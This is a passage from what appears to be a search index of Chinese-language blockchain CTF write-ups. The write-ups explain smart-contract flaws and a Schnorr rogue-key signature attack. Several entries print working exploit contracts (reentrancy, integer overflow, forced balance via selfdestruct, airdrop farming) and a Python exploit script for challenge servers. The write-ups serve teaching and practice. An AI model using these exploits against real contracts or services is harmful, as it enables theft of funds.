\u4f46\u662f\u56e0\u4e3aisbet\u6807\u5fd7\u4f4d\u7684\u95ee\u9898\uff0c\u6211\u4eec\u73b0\u5728\u6709\u4e24\u4e2atoken\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u6267\u884c\u4e00\u6b21betgame\u5e76\u6545\u610f\u8f93\u63891\u4e2atoken\uff0c\u8ba9\u6211\u4eec\u7684token\u6570\u91cf\u4fdd\u6301\u57281\u4ece\u800c\u6267\u884cdoublebetgame\u5b9e\u73b0\u6ea2\u51fa\u3002\u6700\u540epayforflag","title":"bet"},{"location":"blockchain/byte2019_bet_hf/#hf","text":"\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u9898\u76ee\uff0c\u9996\u5148\u9700\u8981\u5bf9evm\u8fdb\u884c\u9006\u5411\u3002 \u76ee\u6807\u662f\u6267\u884cpayforflag\u3002 \u9996\u5148\u6709\u4e00\u4e2a\u7a7a\u6295\u51fd\u6570\uff1a function profit () public { require ( gift [ msg . sender ] == 0 ); gift [ msg . sender ] = 1 ; balanceOf [ msg . sender ] += 1 ; } \u7136\u540e\u6211\u4eec\u5411\u5408\u7ea6\u7684\u8f6c\u8d26\u4f1a\u53d8\u6210\u6211\u4eec\u7684\u4f59\u989d function hfvote () public payable { uint geteth = msg . value / 1000000000000000000 ; balanceOf [ msg . sender ] += geteth ; } \u6f0f\u6d1e\u5728ubw\u51fd\u6570\u4e2d\uff1a function ubw () public payable { if ( msg . value 2 ether ) { node storage n = node0 ; n . nodeadress = msg . sender ; n . nodenumber = 1 ; } else { n . nodeadress = msg . sender ; n . nodenumber = 2 ; } } \u51fd\u6570\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u5206\u652f\u4e0d\u5b58\u5728\u521d\u59cb\u5316\uff0cn\u5728\u6267\u884c\u7684\u65f6\u5019\u4f1a\u5f62\u6210\u672a\u521d\u59cb\u5316\u6f0f\u6d1e\uff0c\u90a3\u4e48\u53ea\u8981\u6211\u4eec\u8fdb\u5165\u7b2c\u4e8c\u4e2a\u5206\u652f\u5c31\u4f1a\u4fee\u6539storage\u4e2d\u7684\u7b2c\u4e00\u4e2a\u503c\u4e3a\u6211\u4eec\u7684\u5730\u5740\uff0c\u7b2c\u4e8c\u4e2a\u503c\u4e3a2 address secret ; uint count ; address owner ; \u7b2c\u4e00\u4e2a\u503c\u4e3asecret \u56e0\u6b64\u901a\u8fc7\u672a\u521d\u59cb\u5316\u6f0f\u6d1e\u6211\u4eec\u53ef\u4ee5\u6267\u884conlySecret\u4fee\u9970\u7684 fate\u51fd\u6570\uff0cfate\u51fd\u6570\u4e2d\u5b58\u5728\u6574\u5f62\u6ea2\u51fa\u6f0f\u6d1e require ( balanceOf [ msg . sender ] - value = 0 ); balanceOf [ msg . sender ] -= value ; balanceOf [ to ] += value ; \u901a\u8fc7\u6574\u5f62\u6ea2\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u5927\u91cf\u4f59\u989d\uff0c\u7136\u540epayforflag\u5373\u53ef\u83b7\u5f97flag\uff1a function payforflag ( string b64email ) public { require ( balanceOf [ msg . sender ] = 100000 ); balanceOf [ msg . sender ] = 0 ; owner . transfer ( address ( this ). balance ); emit SendFlag ( b64email ); }","title":"hf"},{"location":"blockchain/ciscn2019_daysbank/","text":"ciscn 2018 daysbank https://github.com/beafb1b1/challenges/tree/master/ciscn/2018_daysbank \u9996\u5148\u6211\u4eec\u9700\u8981\u9006\u5411\u903b\u8f91\uff0c\u51c6\u5907A\u548cB\u4e24\u4e2a\u8d26\u53f7\uff0c\u5e76\u5206\u522b\u4f7f\u7528\u4e24\u4e2a\u8d26\u53f7\u83b7\u53d6gift\u548cprofit\u3002\u4e3b\u8981gift\u548cprofit\u5404\u53ea\u80fd\u83b7\u53d6\u4e00\u6b21\uff0c\u5e76\u4e14\u6709\u4e25\u683c\u7684\u903b\u8f91\u5148\u540e\u987a\u5e8f\u3002 Gift\u548cprofit\u540e\uff0c\u56e0\u4e3a\u903b\u8f91\u68c0\u67e5\u4e0d\u4e25\u683c\uff0c\u5c06\u4f1a\u62e5\u6709\u8f6c\u8d26\u6743\u9650\uff0c\u6b64\u65f6\u6211\u4eec\u4f7f\u7528\u7b2c\u4e00\u4e2atransfer\uff0c\u5c06\u8d26\u53f72\u7684balance\u8f6c\u7ed9\u8d26\u53f71\u3002 \u8d26\u53f71\u7684balance\u53d8\u4e3a4\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528transfer2\u51fd\u6570\uff0c\u6b64\u65f6\uff0c\u5229\u7528\u6574\u578b\u6ea2\u51fa\uff0c\u5411\u8d26\u53f72\u8f6c\u8d264\u4ee5\u4e0a\u7684balance\uff0c\u90a3\u4e48\u8d26\u53f71\u7684balance\u5c06\u4f1a\u53d8\u4e3a\u6781\u5927\u3002 \u7136\u540epayforflag\u5373\u53ef\u3002","title":"CISCN 2019 Daysbank"},{"location":"blockchain/ciscn2019_daysbank/#ciscn-2018-daysbank","text":"https://github.com/beafb1b1/challenges/tree/master/ciscn/2018_daysbank \u9996\u5148\u6211\u4eec\u9700\u8981\u9006\u5411\u903b\u8f91\uff0c\u51c6\u5907A\u548cB\u4e24\u4e2a\u8d26\u53f7\uff0c\u5e76\u5206\u522b\u4f7f\u7528\u4e24\u4e2a\u8d26\u53f7\u83b7\u53d6gift\u548cprofit\u3002\u4e3b\u8981gift\u548cprofit\u5404\u53ea\u80fd\u83b7\u53d6\u4e00\u6b21\uff0c\u5e76\u4e14\u6709\u4e25\u683c\u7684\u903b\u8f91\u5148\u540e\u987a\u5e8f\u3002 Gift\u548cprofit\u540e\uff0c\u56e0\u4e3a\u903b\u8f91\u68c0\u67e5\u4e0d\u4e25\u683c\uff0c\u5c06\u4f1a\u62e5\u6709\u8f6c\u8d26\u6743\u9650\uff0c\u6b64\u65f6\u6211\u4eec\u4f7f\u7528\u7b2c\u4e00\u4e2atransfer\uff0c\u5c06\u8d26\u53f72\u7684balance\u8f6c\u7ed9\u8d26\u53f71\u3002 \u8d26\u53f71\u7684balance\u53d8\u4e3a4\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528transfer2\u51fd\u6570\uff0c\u6b64\u65f6\uff0c\u5229\u7528\u6574\u578b\u6ea2\u51fa\uff0c\u5411\u8d26\u53f72\u8f6c\u8d264\u4ee5\u4e0a\u7684balance\uff0c\u90a3\u4e48\u8d26\u53f71\u7684balance\u5c06\u4f1a\u53d8\u4e3a\u6781\u5927\u3002 \u7136\u540epayforflag\u5373\u53ef\u3002","title":"ciscn 2018 daysbank"},{"location":"blockchain/collision/","text":"\u533a\u5757\u94fe\u76f8\u5173\u8d44\u6599\u6536\u96c6 OJ \u7ec3\u4e60\u5e73\u53f0: https://ethernaut.openzeppelin.com/ \u6536\u96c6\u7684PPT\u548cDorahacks\u9898\u76ee https://github.com/beafb1b1/challenges/tree/master/blochchains Challenges WCTF belluminar: https://github.com/beched/ctf/tree/master/2018/wctf-belluminar LCTF2018 easy little trick: https://github.com/LCTF/LCTF2018/tree/master/Writeup/easy%20little%20trick lctf2018 gg bank: https://github.com/LCTF/LCTF2018/tree/master/Writeup/gg%20bank","title":"\u8d44\u6599\u6536\u96c6"},{"location":"blockchain/collision/#_1","text":"","title":"\u533a\u5757\u94fe\u76f8\u5173\u8d44\u6599\u6536\u96c6"},{"location":"blockchain/collision/#oj","text":"\u7ec3\u4e60\u5e73\u53f0: https://ethernaut.openzeppelin.com/","title":"OJ"},{"location":"blockchain/collision/#pptdorahacks","text":"https://github.com/beafb1b1/challenges/tree/master/blochchains","title":"\u6536\u96c6\u7684PPT\u548cDorahacks\u9898\u76ee"},{"location":"blockchain/collision/#challenges","text":"WCTF belluminar: https://github.com/beched/ctf/tree/master/2018/wctf-belluminar LCTF2018 easy little trick: https://github.com/LCTF/LCTF2018/tree/master/Writeup/easy%20little%20trick lctf2018 gg bank: https://github.com/LCTF/LCTF2018/tree/master/Writeup/gg%20bank","title":"Challenges"},{"location":"blockchain/hctf_2018_ez2win/","text":"hctf 2018 ez2win https://github.com/beafb1b1/challenges/tree/master/hctf/HCTF2018_ez2win \u5ba1\u8ba1\uff0c\u53d1\u73b0\u5b58\u5728\u5982\u4e0b\u51fd\u6570 function _transfer(address from, address to, uint256 value) { require(value = _balances[from]); require(to != address(0)); require(value = 10000000); _balances[from] = _balances[from].sub(value); _balances[to] = _balances[to].add(value); } \u53ef\u4ee5\u672a\u6388\u6743\u76f4\u63a5\u8fd0\u884c\uff0c\u800c\u5408\u7ea6\u521b\u5efa\u8005\u6709\uff1a uint256 public constant INITIAL_SUPPLY = 20000000000 * (10 ** uint256(decimals)); \u8fd9\u4e48\u591a\u7684token\uff0c\u76f4\u63a5trasfer\u5230\u6211\u7684\u8d26\u6237\u4e0a\uff0c\u7136\u540epayforflag\u5c31\u884c\u4e86\u3002","title":"HCTF2018 ez2win"},{"location":"blockchain/hctf_2018_ez2win/#hctf-2018-ez2win","text":"https://github.com/beafb1b1/challenges/tree/master/hctf/HCTF2018_ez2win \u5ba1\u8ba1\uff0c\u53d1\u73b0\u5b58\u5728\u5982\u4e0b\u51fd\u6570 function _transfer(address from, address to, uint256 value) { require(value = _balances[from]); require(to != address(0)); require(value = 10000000); _balances[from] = _balances[from].sub(value); _balances[to] = _balances[to].add(value); } \u53ef\u4ee5\u672a\u6388\u6743\u76f4\u63a5\u8fd0\u884c\uff0c\u800c\u5408\u7ea6\u521b\u5efa\u8005\u6709\uff1a uint256 public constant INITIAL_SUPPLY = 20000000000 * (10 ** uint256(decimals)); \u8fd9\u4e48\u591a\u7684token\uff0c\u76f4\u63a5trasfer\u5230\u6211\u7684\u8d26\u6237\u4e0a\uff0c\u7136\u540epayforflag\u5c31\u884c\u4e86\u3002","title":"hctf 2018 ez2win"},{"location":"blockchain/n1ctf_2019_smartcontract/","text":"challenges https://github.com/beafb1b1/challenges/tree/master/n1ctf/2019_h4ck_Smart_Contract collectmoney: collect tokens and transfer to contract reentrancy 100 times reentrancy: buy and reentracy to int overflow the sellTimes exploit contract collectmoney{ address addr=0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0; address public reentry; function () payable { } function set_reentry(address target) { reentry=target; } function exploit(uint times) { for (uint i=0;i times;i++) { challenge(addr).buy.value(1)(); challenge(addr).transfer(reentry,1); } } } contract reentrancy{ address addr=0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0; uint have_withdraw; function attack_buy(){ challenge(addr).buy.value(1)(); } function attack(){ challenge(addr).sell(100); } function () payable { if (have_withdraw==0 msg.sender==addr){ have_withdraw=1; challenge(addr).sell(100); } } function getflag() public{ challenge(addr).winnerSubmit(); } } contract transfer_force{ address owner; function () payable { } constructor()public{ owner = msg.sender; } modifier onlyOwner(){ require(msg.sender == owner); _; } function kill(address to) public onlyOwner { selfdestruct(to); } } sth to say This challenge is not use the email solution to send the flag. Instead of that, it use a web interface which have a lot of problems. At the beginning of the game, flag can be obtained by getting someone else's winner's address and submitting it. Later, the organizers limited each winner address to only get flag once. But somebody made trouble by submitting other winner addresss indefinitely. So I had to use the following script to get the final flag. import requests url = http://47.244.41.61/challenge?address=0xfe03e84d6069fd0ca2679638eb80c4483885efd8 while True : print requests . get ( url ) . content . split ( alert )[ 1 ] . split ( script )[ 0 ] Maybe an email BOT is a better choice.","title":"N1CTF2019 h4ck Smart Contract"},{"location":"blockchain/n1ctf_2019_smartcontract/#challenges","text":"https://github.com/beafb1b1/challenges/tree/master/n1ctf/2019_h4ck_Smart_Contract collectmoney: collect tokens and transfer to contract reentrancy 100 times reentrancy: buy and reentracy to int overflow the sellTimes","title":"challenges"},{"location":"blockchain/n1ctf_2019_smartcontract/#exploit","text":"contract collectmoney{ address addr=0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0; address public reentry; function () payable { } function set_reentry(address target) { reentry=target; } function exploit(uint times) { for (uint i=0;i times;i++) { challenge(addr).buy.value(1)(); challenge(addr).transfer(reentry,1); } } } contract reentrancy{ address addr=0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0; uint have_withdraw; function attack_buy(){ challenge(addr).buy.value(1)(); } function attack(){ challenge(addr).sell(100); } function () payable { if (have_withdraw==0 msg.sender==addr){ have_withdraw=1; challenge(addr).sell(100); } } function getflag() public{ challenge(addr).winnerSubmit(); } } contract transfer_force{ address owner; function () payable { } constructor()public{ owner = msg.sender; } modifier onlyOwner(){ require(msg.sender == owner); _; } function kill(address to) public onlyOwner { selfdestruct(to); } }","title":"exploit"},{"location":"blockchain/n1ctf_2019_smartcontract/#sth-to-say","text":"This challenge is not use the email solution to send the flag. Instead of that, it use a web interface which have a lot of problems. At the beginning of the game, flag can be obtained by getting someone else's winner's address and submitting it. Later, the organizers limited each winner address to only get flag once. But somebody made trouble by submitting other winner addresss indefinitely. So I had to use the following script to get the final flag. import requests url = http://47.244.41.61/challenge?address=0xfe03e84d6069fd0ca2679638eb80c4483885efd8 while True : print requests . get ( url ) . content . split ( alert )[ 1 ] . split ( script )[ 0 ] Maybe an email BOT is a better choice.","title":"sth to say"},{"location":"blockchain/qwb2019_babybank_babybet/","text":"\u7b2c\u4e09\u5c4a\u5f3a\u7f51\u676fbabybank babybet babybank\u9898\u76ee\u548cexp babybet\u9898\u76ee\u548cexp babybank \u5f3a\u5236\u8f6c\u8d26\u4f59\u989d\u540e\uff0c\u91cd\u5165\u653b\u51fb+\u6574\u5f62\u6ea2\u51fa\uff0c\u6700\u540epayforflag contract transfer_force { address owner ; function () payable { } constructor () public { owner = msg . sender ; } modifier onlyOwner (){ require ( msg . sender == owner ); _ ; } function kill ( address to ) public onlyOwner { selfdestruct ( to ); } } contract reentrancy { address bb ; uint have_withdraw ; function set_bb ( address target ) { bb = target ; } function withdraw ( uint amount ){ babybank ( bb ). withdraw ( amount ); } function () payable { if ( have_withdraw == 0 ){ have_withdraw = 1 ; babybank ( bb ). withdraw ( 2 ); } } function getflag ( string md5ofteamtoken , string b64email ) public { babybank ( bb ). payforflag ( md5ofteamtoken , b64email ); } } babybet \u8585\u7f8a\u6bdb contract father { function father () payable {} babybet_attack son ; function attack ( uint256 times ) public { for ( uint i = 0 ; i times ; i ++ ){ son = new babybet_attack (); } } function () payable { } } contract babybet_attack { address bbb = 0x5d7aacdf02186810d754cf24d2496b3bdf30d75b ; address mywallet = 0xdAA45B7958aF6B14dc8BFF097AddC449Bc39fB55 ; constructor () public { babybet ( bbb ). profit (); babybet ( bbb ). bet ( 0 ); uint amount = babybet ( bbb ). balance ( address ( this )); if ( amount 500 ){ babybet ( bbb ). transferbalance ( mywallet , 1000 );} } }","title":"QWB 2019 babybank&babybet"},{"location":"blockchain/qwb2019_babybank_babybet/#babybankbabybet","text":"babybank\u9898\u76ee\u548cexp babybet\u9898\u76ee\u548cexp","title":"\u7b2c\u4e09\u5c4a\u5f3a\u7f51\u676fbabybank&amp;babybet"},{"location":"blockchain/qwb2019_babybank_babybet/#babybank","text":"\u5f3a\u5236\u8f6c\u8d26\u4f59\u989d\u540e\uff0c\u91cd\u5165\u653b\u51fb+\u6574\u5f62\u6ea2\u51fa\uff0c\u6700\u540epayforflag contract transfer_force { address owner ; function () payable { } constructor () public { owner = msg . sender ; } modifier onlyOwner (){ require ( msg . sender == owner ); _ ; } function kill ( address to ) public onlyOwner { selfdestruct ( to ); } } contract reentrancy { address bb ; uint have_withdraw ; function set_bb ( address target ) { bb = target ; } function withdraw ( uint amount ){ babybank ( bb ). withdraw ( amount ); } function () payable { if ( have_withdraw == 0 ){ have_withdraw = 1 ; babybank ( bb ). withdraw ( 2 ); } } function getflag ( string md5ofteamtoken , string b64email ) public { babybank ( bb ). payforflag ( md5ofteamtoken , b64email ); } }","title":"babybank"},{"location":"blockchain/qwb2019_babybank_babybet/#babybet","text":"\u8585\u7f8a\u6bdb contract father { function father () payable {} babybet_attack son ; function attack ( uint256 times ) public { for ( uint i = 0 ; i times ; i ++ ){ son = new babybet_attack (); } } function () payable { } } contract babybet_attack { address bbb = 0x5d7aacdf02186810d754cf24d2496b3bdf30d75b ; address mywallet = 0xdAA45B7958aF6B14dc8BFF097AddC449Bc39fB55 ; constructor () public { babybet ( bbb ). profit (); babybet ( bbb ). bet ( 0 ); uint amount = babybet ( bbb ). balance ( address ( this )); if ( amount 500 ){ babybet ( bbb ). transferbalance ( mywallet , 1000 );} } }","title":"babybet"},{"location":"blockchain/realworldctf_2019_bank/","text":"\u5206\u6790 \u9898\u76ee\u4ee3\u7801\u548cexp\uff1a https://github.com/beafb1b1/challenges/tree/master/rwctf/2019_bank schnorr\u7b7e\u540d\uff0c\u5173\u952e\u95ee\u9898\u5728\u8fd9\u91cc\uff1a req . sendall ( Please send us your signature ) msg = self . rfile . readline () . strip () . decode ( base64 ) print balance print gggggggg print verify s pubkey , point_add ( userPk , pk ) if schnorr_verify ( WITHDRAW , point_add ( userPk , pk ), msg ) and balance 0 : print flag!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! req . sendall ( Here is your coin: %s \\n % FLAG ) print gggggggg \u8fd9\u91cc\u76f4\u63a5\u5bf9\u7528\u4e8e\u63d0\u4f9b\u7684\u516c\u94a5\u548c\u670d\u52a1\u5668\u63d0\u4f9b\u7684\u516c\u94a5\u8fdb\u884c\u4e86\u52a0\u6cd5\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u5b9e\u65bdRogue attack\uff0c\u539f\u7406\u5f88\u7b80\u5355\uff0c\u56e0\u4e3a\u6211\u4eec\u4e0d\u77e5\u9053point_add(userPk, pk)\u540e\u7684\u79c1\u94a5\u662f\u4ec0\u4e48\uff0c\u6211\u4eec\u53ea\u77e5\u9053userPk\u5bf9\u5e94\u7684\u79c1\u94a5\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6784\u9020rogue_userPk=userPk-pk, \u867d\u7136\u6211\u4eec\u4e5f\u4e0d\u77e5\u9053rogue_userPk\u7684\u79c1\u94a5\uff0c\u4f46\u662f\u4e0d\u9700\u8981\u77e5\u9053\uff0c\u670d\u52a1\u5668\u63a5\u6536\u5230rogue_userPk\u540e\u4f1a\u8fdb\u884crogue_userPk+pk\u4f5c\u4e3a\u516c\u94a5\u8fdb\u884c\u8ba4\u8bc1\uff0c\u8fd9\u91ccrogue_userPk+pk=userPk\uff0c\u79c1\u94a5\u5df2\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u8fdb\u884c\u7b7e\u540d\u3002\u90a3\u4e48\u95ee\u9898\u7684\u5173\u952e\u662f\u5982\u4f55\u6784\u9020\u5bf9\u5e94\u7684point_sub\uff0c\u5176\u5b9e\u975e\u5e38\u7b80\u5355\uff0c\u692d\u5706\u66f2\u7ebf\u4e0a\u7684\u70b9\u53d6y\u8f74\u5bf9\u79f0\u7684\u70b9\u76f8\u52a0\u5c31\u53ef\u4ee5\uff0c\u4e5f\u5c31\u662f\uff1a def point_sub ( p1 , p2 ): newp2 = ( p2 [ 0 ], - p2 [ 1 ]) return point_add ( p1 , newp2 ) exploit from zio import * import os import hashlib from schnorr import * import base64 target = ( tcp.realworldctf.com , 20014 ) #target=( 127.0.0.1 ,20014) io = zio ( target , print_read = COLORED ( REPR , red ), print_write = COLORED ( REPR , blue ), timeout = 100000 ) def pass_proof ( io ): io . read_until ( starting with ) start = io . readline () . strip () while True : end = os . urandom ( 5 ) if hashlib . sha1 ( start + end ) . hexdigest ()[ - 4 :] == 0000 : io . write ( start + end ) return pass_proof ( io ) io . read_until ( Please tell us your public key: ) mysk , mypk = generate_keys () print mysk print mypk send_pubkey = base64 . b64encode ( str ( mypk [ 0 ]) + , + str ( mypk [ 1 ])) io . writeline ( send_pubkey ) io . read_until ( first priority! ) io . writeline ( 3 . encode ( base64 ) . strip ()) io . read_until ( himself as one of us: ( ) getpubkey = io . read_until ( ) ) . split ( , ) pubkey = ( int ( getpubkey [ 0 ] . replace ( L , )), int ( getpubkey [ 1 ] . split ( L )[ 0 ])) print pubkey io . read_until ( Please tell us your public key: ) io . writeline ( send_pubkey ) io . read_until ( our first priority! ) io . writeline ( 1 . encode ( base64 ) . strip ()) io . read_until ( Please send us your signature ) io . writeline ( base64 . b64encode ( schnorr_sign ( DEPOSIT , mysk ))) io . read_until ( Please tell us your public key: ) roguepk = point_sub ( mypk , pubkey ) send_roguepubkey = base64 . b64encode ( str ( roguepk [ 0 ]) + , + str ( roguepk [ 1 ])) io . writeline ( send_roguepubkey ) io . read_until ( our first priority! ) io . writeline ( 2 . encode ( base64 ) . strip ()) io . read_until ( Please send us your signature ) io . writeline ( base64 . b64encode ( schnorr_sign ( WITHDRAW , mysk ))) #Here is your coin: rwctf{P1Ain_SChNorr_n33Ds_m0re_5ecur1ty!} io . interact ()","title":"RWCTF2019 bank"},{"location":"blockchain/realworldctf_2019_bank/#_1","text":"\u9898\u76ee\u4ee3\u7801\u548cexp\uff1a https://github.com/beafb1b1/challenges/tree/master/rwctf/2019_bank schnorr\u7b7e\u540d\uff0c\u5173\u952e\u95ee\u9898\u5728\u8fd9\u91cc\uff1a req . sendall ( Please send us your signature ) msg = self . rfile . readline () . strip () . decode ( base64 ) print balance print gggggggg print verify s pubkey , point_add ( userPk , pk ) if schnorr_verify ( WITHDRAW , point_add ( userPk , pk ), msg ) and balance 0 : print flag!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! req . sendall ( Here is your coin: %s \\n % FLAG ) print gggggggg \u8fd9\u91cc\u76f4\u63a5\u5bf9\u7528\u4e8e\u63d0\u4f9b\u7684\u516c\u94a5\u548c\u670d\u52a1\u5668\u63d0\u4f9b\u7684\u516c\u94a5\u8fdb\u884c\u4e86\u52a0\u6cd5\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u5b9e\u65bdRogue attack\uff0c\u539f\u7406\u5f88\u7b80\u5355\uff0c\u56e0\u4e3a\u6211\u4eec\u4e0d\u77e5\u9053point_add(userPk, pk)\u540e\u7684\u79c1\u94a5\u662f\u4ec0\u4e48\uff0c\u6211\u4eec\u53ea\u77e5\u9053userPk\u5bf9\u5e94\u7684\u79c1\u94a5\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6784\u9020rogue_userPk=userPk-pk, \u867d\u7136\u6211\u4eec\u4e5f\u4e0d\u77e5\u9053rogue_userPk\u7684\u79c1\u94a5\uff0c\u4f46\u662f\u4e0d\u9700\u8981\u77e5\u9053\uff0c\u670d\u52a1\u5668\u63a5\u6536\u5230rogue_userPk\u540e\u4f1a\u8fdb\u884crogue_userPk+pk\u4f5c\u4e3a\u516c\u94a5\u8fdb\u884c\u8ba4\u8bc1\uff0c\u8fd9\u91ccrogue_userPk+pk=userPk\uff0c\u79c1\u94a5\u5df2\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u8fdb\u884c\u7b7e\u540d\u3002\u90a3\u4e48\u95ee\u9898\u7684\u5173\u952e\u662f\u5982\u4f55\u6784\u9020\u5bf9\u5e94\u7684point_sub\uff0c\u5176\u5b9e\u975e\u5e38\u7b80\u5355\uff0c\u692d\u5706\u66f2\u7ebf\u4e0a\u7684\u70b9\u53d6y\u8f74\u5bf9\u79f0\u7684\u70b9\u76f8\u52a0\u5c31\u53ef\u4ee5\uff0c\u4e5f\u5c31\u662f\uff1a def point_sub ( p1 , p2 ): newp2 = ( p2 [ 0 ], - p2 [ 1 ]) return point_add ( p1 , newp2 )","title":"\u5206\u6790"},{"location":"blockchain/realworldctf_2019_bank/#exploit","text":"from zio import * import os import hashlib from schnorr import * import base64 target = ( tcp.realworldctf.com , 20014 ) #target=( 127.0.0.1 ,20014) io = zio ( target , print_read = COLORED ( REPR , red ), print_write = COLORED ( REPR , blue ), timeout = 100000 ) def pass_proof ( io ): io . read_until ( starting with ) start = io . readline () . strip () while True : end = os . urandom ( 5 ) if hashlib . sha1 ( start + end ) . hexdigest ()[ - 4 :] == 0000 : io . write ( start + end ) return pass_proof ( io ) io . read_until ( Please tell us your public key: ) mysk , mypk = generate_keys () print mysk print mypk send_pubkey = base64 . b64encode ( str ( mypk [ 0 ]) + , + str ( mypk [ 1 ])) io . writeline ( send_pubkey ) io . read_until ( first priority! ) io . writeline ( 3 . encode ( base64 ) . strip ()) io . read_until ( himself as one of us: ( ) getpubkey = io . read_until ( ) ) . split ( , ) pubkey = ( int ( getpubkey [ 0 ] . replace ( L , )), int ( getpubkey [ 1 ] . split ( L )[ 0 ])) print pubkey io . read_until ( Please tell us your public key: ) io . writeline ( send_pubkey ) io . read_until ( our first priority! ) io . writeline ( 1 . encode ( base64 ) . strip ()) io . read_until ( Please send us your signature ) io . writeline ( base64 . b64encode ( schnorr_sign ( DEPOSIT , mysk ))) io . read_until ( Please tell us your public key: ) roguepk = point_sub ( mypk , pubkey ) send_roguepubkey = base64 . b64encode ( str ( roguepk [ 0 ]) + , + str ( roguepk [ 1 ])) io . writeline ( send_roguepubkey ) io . read_until ( our first priority! ) io . writeline ( 2 . encode ( base64 ) . strip ()) io . read_until ( Please send us your signature ) io . writeline ( base64 . b64encode ( schnorr_sign ( WITHDRAW , mysk ))) #Here is your coin: rwctf{P1Ain_SChNorr_n33Ds_m0re_5ecur1ty!} io . interact ()","title":"exploit"},{"location":"blockchain/szjj_2019_final_cow_rise/","text":"ssjj2019final cow rise https://github.com/beafb1b1/challenges/tree/master/szjj/ssjj_final_cow_rise","title":"\u6570\u5b57\u7ecf\u6d4e 2019 final rise cow"},{"location":"blockchain/szjj_2019_final_cow_rise/#ssjj2019final-cow-rise","text":"https://github.com/beafb1b1/challenges/tree/master/szjj/ssjj_final_cow_rise","title":"ssjj2019final cow &amp; rise"},{"location":"blockchain/szjj_2019_jojo/","text":"\u6570\u5b57\u7ecf\u6d4e\u4e91\u516c\u6d4bCTF jojo \u9898\u76ee: https://github.com/beafb1b1/challenges/tree/master/szjj/2019_jojo \u9996\u5148\u6211\u4eec\u60f3\u8981payforflag\uff0c\u9700\u8981\u670910w\u4f59\u989d function payforflag ( string b64email ) public { require ( balanceOf [ msg . sender ] = 100000 ); emit SendFlag ( b64email ); } \u7a0b\u5e8f\u5141\u8bb8\u9009\u624b\u60f3\u5408\u7ea6\u8f6c\u8d26\uff0c\u8f6c\u8d26\u7684\u4ee5\u592a\u574a\u6570\u91cf\u5c31\u662f\u4f59\u989d function jojogame () payable { uint geteth = msg . value / 1000000000000000000 ; balanceOf [ msg . sender ] += geteth ; } \u7a7a\u6295\u51fd\u6570gift function gift () public { assert ( gift [ msg . sender ] == 0 ); balanceOf [ msg . sender ] += 100 ; gift [ msg . sender ] = 1 ; } \u8f6c\u8d26\u51fd\u6570 function transfer ( address to , uint value ) public { assert ( balanceOf [ msg . sender ] = value ); balanceOf [ msg . sender ] -= value ; balanceOf [ to ] += value ; } \u8f6c\u6218\u51fd\u6570\u65e0\u6cd5\u6574\u5f62\u6ea2\u51fa\uff0c\u8fd9\u91cc\u8003\u70b9\u5c31\u662f\u8585\u7f8a\u6bdb\u653b\u51fb \u901a\u8fc7\u5efa\u7acb\u591a\u4e2a\u81ea\u5408\u7ea6\u9886\u53d6\u7a7a\u6295\uff0c\u7136\u540e\u8f6c\u8d26\u7ed9\u56fa\u5b9a\u8d26\u6237\u5373\u53ef\u5b8c\u6210\u653b\u51fbpayforflag contract father { function createsons (){ for ( uint i = 0 ; i 100 ; i ++ ) { son ason = new son (); } } } contract son { constructor () public { jojo tmp = jojo ( 0xd86ed76112295a07c675974995b9805912282eb3 ); tmp . gift (); tmp . transfer ( 0xafFE1Eeea46Ec23a87C7894d90Aa714552468cAF , 100 ); } }","title":"\u6570\u5b57\u7ecf\u6d4e 2019 jojo"},{"location":"blockchain/szjj_2019_jojo/#ctf-jojo","text":"\u9898\u76ee: https://github.com/beafb1b1/challenges/tree/master/szjj/2019_jojo \u9996\u5148\u6211\u4eec\u60f3\u8981payforflag\uff0c\u9700\u8981\u670910w\u4f59\u989d function payforflag ( string b64email ) public { require ( balanceOf [ msg . sender ] = 100000 ); emit SendFlag ( b64email ); } \u7a0b\u5e8f\u5141\u8bb8\u9009\u624b\u60f3\u5408\u7ea6\u8f6c\u8d26\uff0c\u8f6c\u8d26\u7684\u4ee5\u592a\u574a\u6570\u91cf\u5c31\u662f\u4f59\u989d function jojogame () payable { uint geteth = msg . value / 1000000000000000000 ; balanceOf [ msg . sender ] += geteth ; } \u7a7a\u6295\u51fd\u6570gift function gift () public { assert ( gift [ msg . sender ] == 0 ); balanceOf [ msg . sender ] += 100 ; gift [ msg . sender ] = 1 ; } \u8f6c\u8d26\u51fd\u6570 function transfer ( address to , uint value ) public { assert ( balanceOf [ msg . sender ] = value ); balanceOf [ msg . sender ] -= value ; balanceOf [ to ] += value ; } \u8f6c\u6218\u51fd\u6570\u65e0\u6cd5\u6574\u5f62\u6ea2\u51fa\uff0c\u8fd9\u91cc\u8003\u70b9\u5c31\u662f\u8585\u7f8a\u6bdb\u653b\u51fb \u901a\u8fc7\u5efa\u7acb\u591a\u4e2a\u81ea\u5408\u7ea6\u9886\u53d6\u7a7a\u6295\uff0c\u7136\u540e\u8f6c\u8d26\u7ed9\u56fa\u5b9a\u8d26\u6237\u5373\u53ef\u5b8c\u6210\u653b\u51fbpayforflag contract father { function createsons (){ for ( uint i = 0 ; i 100 ; i ++ ) { son ason = new son (); } } } contract son { constructor () public { jojo tmp = jojo ( 0xd86ed76112295a07c675974995b9805912282eb3 ); tmp . gift (); tmp . transfer ( 0xafFE1Eeea46Ec23a87C7894d90Aa714552468cAF , 100 ); } }","title":"\u6570\u5b57\u7ecf\u6d4e\u4e91\u516c\u6d4bCTF 